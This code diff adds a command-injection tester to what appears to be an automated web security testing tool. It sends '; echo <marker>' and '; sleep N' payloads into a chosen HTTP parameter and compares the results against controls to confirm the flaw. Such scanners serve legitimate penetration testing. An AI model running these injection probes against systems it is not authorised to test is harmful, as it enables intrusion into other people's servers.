@@ -16,6 +16,7 @@ from __future__ import annotations
 
 import json
 from pathlib import Path
+from urllib.parse import urlencode
 
 from tools.httpx import Session, save_evidence
 
@@ -117,6 +118,94 @@ class HttpIdorExecutors:
             "false_positive_reason": fp_reason,
             "requests_used": s.request_count,
         }
+        _save(store.dir / "findings" / f"{fid}.json", finding)
+        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
+                "status": status, "requests_used": s.request_count}
+
+    def report(self, store):
+        return SimulationExecutors({}).report(store)
+
+
+class HttpCmdiExecutors:
+    """Code implementation of the cmdi.md procedure over real HTTP (no LLM).
+
+    Strategy (matches the skill):
+      1. Reflected: send a unique marker behind a separator (`; echo <marker>`) and also as
+         a plain literal control. Confirm only if the marker appears for the injection but
+         NOT for the literal control (i.e. it is command output, not input echoed back).
+      2. Blind/time-based fallback: inject `; sleep N` and compare timing against a
+         `sleep 0` control, reproduced twice.
+
+    params:
+      base_url, endpoint, param, method ("GET"|"POST"), blind_delay (seconds).
+    """
+
+    def __init__(self, base_url, endpoint, param, method="GET", blind_delay=1.0):
+        self.base = base_url
+        self.endpoint = endpoint
+        self.param = param
+        self.method = method.upper()
+        self.blind_delay = blind_delay
+
+    def _send(self, s, value):
+        if self.method == "POST":
+            return s.post(self.endpoint, data={self.param: value})
+        url = self.endpoint + "?" + urlencode({self.param: value})
+        return s.get(url)
+
+    def recon(self, store, urls, objective):
+        hyp = {"id": "H-001", "endpoint": self.endpoint, "method": self.method,
+               "parameter": self.param, "class": "CMDI", "confidence": "medium",
+               "reason": f"Parameter '{self.param}' may reach an OS command.",
+               "status": "open"}
+        _save(store.dir / "recon" / "hypotheses.json", [hyp])
+        return {"requests_used": 0}
+
+    def hunt(self, store, hyp, urls):
+        import secrets
+        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
+        ev_dir = store.dir / "findings" / "evidence" / fid
+        token = "HB" + secrets.token_hex(4)
+        s = Session(self.base)
+        files = []
+
+        control = self._send(s, token)                 # literal: does the app echo input?
+        inject = self._send(s, f"x; echo {token}")      # reflected injection
+        files += save_evidence(ev_dir, "control-literal", control)
+        files += save_evidence(ev_dir, "inject-reflected", inject)
+        control_reflects = token in control.body
+        inject_reflects = token in inject.body
+
+        status = severity = payload = proof = fp_reason = None
+        if inject_reflects and not control_reflects:
+            status, severity = "confirmed", "high"
+            payload = f"{self.param}=x; echo {token}"
+            proof = f"Unique marker {token} returned as command output (absent from the literal control)."
+        elif inject_reflects and control_reflects:
+            status = "false-positive"
+            fp_reason = "marker reflected even without a command separator (input echoed, not executed)"
+        else:
+            # Blind / time-based fallback, reproduced twice.
+            base0 = self._send(s, "x; sleep 0")
+            d1 = self._send(s, f"x; sleep {self.blind_delay}")
+            d2 = self._send(s, f"x; sleep {self.blind_delay}")
+            files += save_evidence(ev_dir, "timing-control-sleep0", base0)
+            files += save_evidence(ev_dir, "timing-inject-sleepN", d1)
+            thr = self.blind_delay * 0.6
+            if (d1.elapsed - base0.elapsed) >= thr and (d2.elapsed - base0.elapsed) >= thr:
+                status, severity = "confirmed", "high"
+                payload = f"{self.param}=x; sleep {self.blind_delay}"
+                proof = (f"Injected sleep added ~{self.blind_delay}s vs a sleep-0 control "
+                         f"(control={base0.elapsed:.2f}s, injected={d1.elapsed:.2f}s/"
+                         f"{d2.elapsed:.2f}s), reproduced twice.")
+            else:
+                status = "unconfirmed"
+
+        finding = {"id": fid, "hypothesis_id": hyp["id"], "class": "CMDI", "status": status,
+                   "endpoint": self.endpoint, "method": self.method, "parameter": self.param,
+                   "severity": severity, "payload": payload, "proof": proof,
+                   "evidence": {"dir": f"findings/evidence/{fid}/", "files": files},
+                   "false_positive_reason": fp_reason, "requests_used": s.request_count}
         _save(store.dir / "findings" / f"{fid}.json", finding)
         return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
                 "status": status, "requests_used": s.request_count}
